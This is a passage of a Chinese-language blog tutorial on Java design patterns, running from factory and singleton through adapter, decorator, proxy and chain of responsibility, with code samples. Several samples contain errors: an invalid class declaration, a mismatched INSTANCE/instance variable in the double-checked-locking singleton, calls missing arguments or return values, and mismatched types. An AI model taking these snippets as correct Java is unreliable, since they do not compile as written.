</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而实现我们可以这么编写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SuperCarFactory implements CarFactory <span class="keyword">throws</span> CarDoesNotExistException&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Car <span class="title">getCar</span><span class="params">(String s)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s.equals(<span class="string">&quot;Porsche&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Porsche();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s.equals(<span class="string">&quot;Ferrari&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Ferrari();</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> CarDoesNotExistException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这里我就省略 <code>Porsche</code> 和 <code>Ferrari</code> 的具体实现了。客户端现在就可以通过调用 <code>getCar</code> 方法来获取想要的 <code>Car</code>。而这个 <code>Car</code> 具体是什么类型，是如何创造的，客户端完全无需担心。</p><h3 id="抽象工厂模式"><a class="markdownIt-Anchor" href="#抽象工厂模式"></a> 抽象工厂模式</h3><blockquote><p>提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。</p></blockquote><p>抽象工厂模式相当于工厂模式的进一步抽象，在工厂模式中我们定义了 <code>CarFactory</code> 接口，而我们可能会有很多个工厂的实现类，例如 <code>SuperCarFactory</code>, <code>RaceCarFactory</code> 等。我们进一步的把这些工厂抽象为一个 <code>AbstractFactory</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AbstractCarFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> AbstractFactory <span class="title">createFactory</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (name.equalsIgnoreCase(<span class="string">&quot;super-car&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> SuperCarFactory();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (name.equalsIgnoreCase(<span class="string">&quot;race-car&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> RaceCarFactory();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> CarFactoryDoesNotExistException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们甚至无需关心工厂的类型，只需要关心创建出的产品。</p><h3 id="单例模式"><a class="markdownIt-Anchor" href="#单例模式"></a> 单例模式</h3><blockquote><p>保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p></blockquote><p>单例模式是为了保证某个对象始终只有一个实例。实现单例模式很简单：</p><ol><li>构造方法为 <code>private</code>，确保外部无法实例化</li><li>通过 <code>private static</code> 变量持有唯一实例，保证全局唯一性</li><li>通过 <code>public static</code> 方法返回此唯一实例，使外部调用方能获取到实例</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 唯一实例的引用</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// private构造方法保证外部无法实例化:</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外单例模式还有延迟加载的方式，即只有在第一次调用 <code>getInstance()</code> 时才会初始化单例的实例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> Singleton INSTANCE = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (INSTANCE == <span class="keyword">null</span>) &#123;</span><br><span class="line">            INSTANCE = <span class="keyword">new</span> Singleton();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然而在多线程环境下这种写法显然是错误的，解决方法一种是可以在 <code>getInstance()</code> 方法添加 <code>synchronize</code> 修饰，但是这会严重影响并发性能。因此我们有了双重检查机制：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Singleton</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> Singleton INSTANCE = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Singleton</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title">getInstance</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">synchronized</span> (Singleton.class) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    instance = <span class="keyword">new</span> Singleton();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样的话只有在对象未创建时才会发生竞争。注意 <code>INSTANCE</code> 参数前添加的 <code>volatile</code> 修饰符。由于Java内存模型的原因，创建对象并不是一个原子操作。线程 A 执行到 <code>instance = new Singleton();</code> 时，<code>instance</code> 不为 null 了，但是对象的初始化可能尚未完成，线程 B 可能获取到一个尚未完全初始化的对象。而 <code>volatile</code> 关键字禁用了指令重排序并且强制任何工作内存空间的修改立即更新到主内存空间，便雄安除了这种问题。具体解释可以看另一篇 <a href="https://www.jianshu.com/p/4586cb11c62d">博客</a></p><h3 id="建造者模式"><a class="markdownIt-Anchor" href="#建造者模式"></a> 建造者模式</h3><blockquote><p>将一个复杂对象的构建与它的表示分离，使得同样的构建过程可以创建不同的表示。</p></blockquote><p>当我们使用Builder的时候，一般来说，是因为创建这个对象的步骤比较多，每个步骤都需要一个零部件，最终组合成一个完整的对象。</p><p>假设我们在创建一个 <code>Car</code> 对象时，可能有非常多的子组件，例如 <code>Engine</code>, <code>Tire</code>, <code>Transmission</code> 等等。而这些子对象可能也由更多子对象构成。如果我们创建Car对象的过程还需要一个个创建这些对象就十分麻烦，因此我们就有了建造者模式。我们可以写一个 <code>CarBuilder</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CarBuilder</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> EngineBuilder engineBuilder = <span class="keyword">new</span> EngineBuilder();</span><br><span class="line">    <span class="keyword">private</span> TireBuilder tireBuilder = <span class="keyword">new</span> TireBuilder();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Car <span class="title">build</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Car car = <span class="keyword">new</span> Car();</span><br><span class="line">        car.setEngine(engineBuilder.build());</span><br><span class="line">        car.setTire(tireBuilder.build());</span><br><span class="line">        <span class="keyword">return</span> car;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样层层委托，便可以构造出一个对象，而客户端无需关心构建对象的细节。</p><h1 id="结构型模式"><a class="markdownIt-Anchor" href="#结构型模式"></a> 结构型模式</h1><h3 id="适配器模式"><a class="markdownIt-Anchor" href="#适配器模式"></a> 适配器模式</h3><blockquote><p>将一个类的接口转换成客户希望的另外一个接口，使得原本由于接口不兼容而不能一起工作的那些类可以一起工作。</p></blockquote><p>适配器模式就是如果我们已经有了一个类 A 的某种实现，现在我们有了一种新的接口 B，我们希望让类 A 也可以适应这种接口 B。直接修改类 A 会使得原本使用类 A 的所有代码都变得不可用，因此我们可以定义一种适配器，将对于接口 B 的调用转换为对类 A 的调用。例如现在我们有一个 Task 类实现了 Callable 接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Task</span> <span class="keyword">implements</span> <span class="title">Callable</span>&lt;<span class="title">Long</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">long</span> num;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Task</span><span class="params">(<span class="keyword">long</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.num = num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">call</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> r = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> n = <span class="number">1</span>; n &lt;= <span class="keyword">this</span>.num; n++) &#123;</span><br><span class="line">            r = r + n;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Result: &quot;</span> + r);</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而如果我们想把他放在一个线程中执行，程序会报错，因为 Java 的 Thread 只接受 <code>Runnable</code> 接口的对象，因此我们可以编写一个适配器：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RunnableAdapter</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 引用待转换接口:</span></span><br><span class="line">    <span class="keyword">private</span> Callable&lt;?&gt; callable;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">RunnableAdapter</span><span class="params">(Callable&lt;?&gt; callable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.callable = callable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 实现指定接口:</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将指定接口调用委托给转换接口调用:</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            callable.call();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这一适配器我们就把 Task 适配为了 Runnable。</p><h3 id="过滤器模式"><a class="markdownIt-Anchor" href="#过滤器模式"></a> 过滤器模式</h3><h3 id="组合模式"><a class="markdownIt-Anchor" href="#组合模式"></a> 组合模式</h3><blockquote><p>将对象组合成树形结构以表示“部分-整体”的层次结构，使得用户对单个对象和组合对象的使用具有一致性。</p></blockquote><p>这种模式非常适用于树状接口，把叶子节点和根节点统一管理。例如我们常见的 HTML，一个父节点会包含多个子节点，而子节点一会包含更多的子节点，因此我们可以用同一种接口来抽象父节点与子节点：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 添加一个节点为子节点:</span></span><br><span class="line">    <span class="function">Node <span class="title">add</span><span class="params">(Node node)</span></span>;</span><br><span class="line">    <span class="comment">// 获取子节点:</span></span><br><span class="line">    <span class="function">List&lt;Node&gt; <span class="title">children</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="comment">// 输出为HTML:</span></span><br><span class="line">    <span class="function">String <span class="title">toHtml</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="装饰器模式"><a class="markdownIt-Anchor" href="#装饰器模式"></a> 装饰器模式</h3><blockquote><p>动态地给一个对象添加一些额外的职责。就增加功能来说，相比生成子类更为灵活。</p></blockquote><p>使用装饰器模式，我们可以在运行期间给对象实例增加新的功能。如果不使用装饰器模式，每一种功能都需要对应的子类，那样的话子类的数量过多。而使用装饰器模式就可以缓解这些问题。</p><p>例如 Java 中的 <code>InputStream</code>，本身不带有附加功能，而我们可以通过使用 <code>BufferedInputStream</code>, <code>GZIPInputStream</code> 这样的装饰器来 <code>InputStream</code> 添加功能：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">InputStream input = <span class="keyword">new</span> GZIPInputStream( <span class="comment">// 第二层装饰</span></span><br><span class="line">                        <span class="keyword">new</span> BufferedInputStream( <span class="comment">// 第一层装饰</span></span><br><span class="line">                            <span class="keyword">new</span> FileInputStream(<span class="string">&quot;test.gz&quot;</span>) <span class="comment">// 核心功能</span></span><br><span class="line">                        ));</span><br></pre></td></tr></table></figure><h3 id="外观模式"><a class="markdownIt-Anchor" href="#外观模式"></a> 外观模式</h3><blockquote><p>为子系统中的一组接口提供一个一致的界面。Facade模式定义了一个高层接口，这个接口使得这一子系统更加容易使用。</p></blockquote><p>原本客户端可能要与系统内的多个子系统打交道，这样客户端就需要了解系统的各个接口，十分麻烦。如果有这样一个中介可以替客户端完成对于这些接口的访问，那么客户端使用起来则较为方便。例如如果我们想要组装一个 HTTP POST 请求，我们需要组装 Header 和 Body：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Header</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Header <span class="title">getHeader</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Body</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Header <span class="title">getBody</span><span class="params">()</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设我们的客户端很懒连这些都不想做，那我们可以提供这样一种中介：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpRequestFacade</span></span>&#123;</span><br><span class="line">    Header header = <span class="keyword">new</span> Header();</span><br><span class="line">    Body body = <span class="keyword">new</span> Body();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> HttpRequest <span class="title">getRequest</span><span class="params">()</span></span>&#123;</span><br><span class="line">        requestHeader = header.getHeader();</span><br><span class="line">        requestBody = body.getBody();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> HttpRequest(requestHeader, requestBody);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样客户端就不再需要去和具体的模块打交道。</p><h3 id="代理模式"><a class="markdownIt-Anchor" href="#代理模式"></a> 代理模式</h3><blockquote><p>为其他对象提供一种代理以控制对这个对象的访问。</p></blockquote><p>代理模式和Adaptor模式类似，都是在原有的接口上包装一层。但不同的是适配器模式是为了把 A 接口转换为 B 接口。而代理模式的输出仍然是 A 接口，但是我们在调用过程中添加了新的功能。例如现在我们有一个业务逻辑的类<code>GoogleUserController</code>，用来处理谷歌账号的登录，他的定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoogleUserController</span> <span class="keyword">implements</span> <span class="title">UserController</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login</span><span class="params">(String username, String password)</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logout</span><span class="params">(String username)</span></span>&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在我们希望在用户登录或者是登出时，在控制台输出日志，那么我们可以创建一个代理类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoogleUserControllerProxy</span> <span class="keyword">implements</span> <span class="title">UserController</span></span>&#123;</span><br><span class="line">    GoogleUserController controller;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">GoogleUserControllerProxy</span><span class="params">(GoogleUserController controller)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.controller = controller;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">login</span><span class="params">(String username, String password)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User &#123;&quot;</span> + username + <span class="string">&quot;&#125; try to log in&quot;</span>);</span><br><span class="line">        controller.login();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">logout</span><span class="params">(String username)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;User &#123;&quot;</span> + username + <span class="string">&quot;&#125; try to log out&quot;</span>);</span><br><span class="line">        controller.logout();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以后我们只要给客户端提供 <code>GoogleUserControllerProxy</code>，那么所有的登录就自动加上了日志，而客户端甚至不知道我们对这个类进行了修改。实际上 Spring 中的 AOP 就是基于代理模式</p><h1 id="行为型模式"><a class="markdownIt-Anchor" href="#行为型模式"></a> 行为型模式</h1><h3 id="责任链模式"><a class="markdownIt-Anchor" href="#责任链模式"></a> 责任链模式</h3><blockquote><p>使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止。</p></blockquote><p>定义中表述的十分明确，责任链模式把多个处理器串成链，然后让请求在链上传递，直到链中有一个对象处理了该请求。在我们的生活中有很多这样的例子，例如运营商的营业厅，市分公司，省分公司，总公司等。一个营业厅如果想要申请一笔资金，就要向市分公司汇报，市公司处理不了就要交给省公司，逐级往上，直到事务请求处理了为止。首先我们要定义一个事务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">request</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String amount;</span><br><span class="line">    <span class="comment">// 构造器，getter，setter 省略</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们要把事务处理统一成接口：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 返回Boolean.TRUE = 成功</span></span><br><span class="line">    <span class="comment">// 返回Boolean.FALSE = 拒绝</span></span><br><span class="line">    <span class="comment">// 返回null = 交下一个处理</span></span><br><span class="line"><span class="function">Boolean <span class="title">process</span><span class="params">(Request request)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就可以编写各个公司，以是公司为例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CityLevelCompany</span> <span class="keyword">implements</span> <span class="title">Handler</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">process</span><span class="params">(Request request)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 如果超过1000元，处理不了，交下一个处理:</span></span><br><span class="line">        <span class="keyword">if</span> (request.getAmount() &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">// 内部判断审批是否通过的逻辑</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就需要构造一个责任链的原型，使得这些 Handler 可以被连接起来：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HandlerChain</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 持有所有Handler:</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Handler&gt; handlers = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addHandler</span><span class="params">(Handler handler)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.handlers.add(handler);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">process</span><span class="params">(Request request)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 依次调用每个Handler:</span></span><br><span class="line">        <span class="keyword">for</span> (Handler handler : handlers) &#123;</span><br><span class="line">            Boolean r = handler.process(request);</span><br><span class="line">            <span class="keyword">if</span> (r != <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果返回TRUE或FALSE，处理结束:</span></span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">&quot;Could not handle request: &quot;</span> + request);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们就可以构造我们的责任链并处理请求了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HandlerChain chain = <span class="keyword">new</span> HandlerChain();</span><br><span class="line">chain.addHandler(<span class="keyword">new</span> ManagerHandler());</span><br><span class="line">chain.addHandler(<span class="keyword">new</span> DirectorHandler());</span><br><span class="line">chain.addHandler(<span class="keyword">new</span> CEOHandler());</span><br><span class="line"><span class="comment">// 处理请求</span></span><br><span class="line">chain.process(<span class="keyword">new</span> Request(<span class="string">&quot;Bob&quot;</span>, <span class="number">10000</span>));</span><br></pre></td></tr></table></figure><p>在 J2EE 中，Servlet规范规定的过滤器就是一种责任链模式，不同的是责任链中的每一个 Filter 都有处理请求的机会，前部的 Filter 可以向 request 和 response 中添加元素，也可以决定是否放行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;创建型模式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#创建型模式&quot;&gt;&lt;/a&gt; 创建型模式&lt;/h1&gt;
&lt;h3 id=&quot;工厂模式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#工厂模式&quot;&gt;&lt;/a&gt; 工厂模式&lt;</summary>
      
    
    
    
